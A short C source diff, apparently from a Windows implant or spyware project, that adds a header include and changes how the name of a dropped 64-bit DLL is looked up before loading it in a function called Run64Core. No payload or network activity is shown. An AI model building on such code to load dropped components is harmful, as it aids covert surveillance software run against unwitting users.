@@ -3,6 +3,7 @@
 #include "HM_SafeProcedures.h"
 #include "H4-DLL.h"
 #include "common.h"
+#include "bss.h"
 
 typedef void (__stdcall *Sleep_t)(DWORD);
 
@@ -163,7 +164,7 @@ void Run64Core()
 		return;
 
 	// Se il file non e' stato droppato, non cerca di caricarlo
-	HM_CompletePath(H64DLL_NAME, dll64_path);
+	HM_CompletePath(shared.H64DLL_NAME, dll64_path);
 	hfile = CreateFileA(dll64_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
 	if (hfile == INVALID_HANDLE_VALUE)
 		return;
